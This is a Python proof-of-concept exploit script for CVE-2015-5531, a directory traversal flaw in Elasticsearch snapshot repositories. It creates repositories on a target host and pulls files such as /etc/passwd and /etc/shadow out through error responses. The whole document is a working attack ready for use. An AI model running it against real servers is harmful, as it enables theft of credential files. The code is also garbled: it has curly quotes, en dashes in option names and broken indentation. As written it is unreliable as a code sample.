#!/usr/bin/env python
# -*- coding:utf8 -*-
"""
PoC for CVE-2015-5531
Affects ElasticSearch 1.6.0 and prior
详情见http://www.freebuf.com/vuls/99942.html
"""
import re
import sys
import json
import requests
import urllib
import argparse
import traceback
import termcolor
def colorize_red(string):
    """
    :param string:
    :return
    """
    return termcolor.colored(string, 'red')
def colorize_green(string):
    """
    :param string:
    :return:
    """
    return termcolor.colored(string, 'green')
def create_repos(base_url):
    """
    :param base_url:
    :return: None
    """
    for index, repo_name in enumerate(REPO_NAME_LST):

        url = "{0}{1}".format(base_url, repo_name)
        req = requests.post(url, json=DATA_REPO_LST[index])

        if “acknowledged” in req.json():
            print colorize_green(“repository {0}: create success”.format(repo_name))
def grab_file(vuln_url):
    “”"
    :param xplurl:
    :return:
    “”"

    req = requests.get(vuln_url)
    if req.status_code == 400:
        data = req.json()
        extrdata = re.findall(r’\d+’, str(data['error']))
        decoder = bytearray()
        for i in extrdata[2:]:
            decoder.append(int(i))
        print colorize_green(decoder)
def exploit(**args):
    “”"
    :param args:
    :return:
    “”"
    target = args['target']
    port = args['port']
    fpath = args['fpath'].split(‘,’)
    fpath = [urllib.quote(fp, safe='') for fp in fpath]
    base_url = “http://{0}:{1}/_snapshot/”.format(target, port)
    #create elasticsearch repository for snapshot
    create_repos(base_url)
    #grab files
    for fp in fpath:
        vuln_url = ‘{0}{1}/{2}{3}’.format(base_url, REPO_NAME_LST[0], FCK, fp)
        print colorize_red(urllib.unquote(fp)) + “:\n”
        grab_file(vuln_url)
if __name__ == “__main__”:
    # for global
    FCK = ‘backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..’
    REPO_NAME_LST = ['test11', 'test12']

   DATA_REPO_LST = [{"type": "fs", "settings": {"location":
"/tmp/test30"}}, {"type": "fs", "settings": {"location":
"/tmp/test30/snapshot-backdata"}}]
    parser = argparse.ArgumentParser(usage=”python cve-2015-5531.py options”,
                                     description=”cve-2015-5531 Vuln PoC”, add_help=True)
    parser.add_argument(‘-t’, ‘–target’, metavar=’TARGET’, type=str, dest=”target”, required=True, help=’eg: 127.0.0.1 or www.baidu.com’)

   parser.add_argument(‘-p’, ‘–port’, metavar=’PORT’, dest=’port’,
type=int, default=9200, help=’elasticsearch port default 9200′)

 parser.add_argument(‘–fpath’, metavar=’FPATH’, dest=’fpath’, type=str,
 default=’/etc/passwd,/etc/shadow’, help=’file to grab multi files
separated by comma ‘)
    args = parser.parse_args()
    try:
        exploit(**args.__dict__)
    except:
        traceback.print_exc()